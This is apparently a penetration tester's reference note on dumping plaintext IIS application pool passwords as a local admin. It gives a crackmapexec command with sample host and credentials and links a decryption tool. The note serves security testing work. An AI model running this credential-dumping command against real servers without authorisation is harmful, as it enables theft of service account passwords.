---
title: IIS AppPool Dump
---

[[notes/mitre-attack/credential-access|Access Credentials]] from the IIS service account as [[notes/windows/credential-access-admin|local admin]].

Retrieve plain passwords of IIS application pools ([source](https://twitter.com/mpgn_x64/status/1693249217609740470)).

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb web01.corp.local -u jdoeadm -p 'passw0rd' -M iis
    ~~~

    If the module can not dump the password of an account it is probably a gMSA.

Untested tools:

- [AppPoolCredDecrypt](https://github.com/xpn/RandomTSScripts/tree/master/apppoolcreddecrypt)
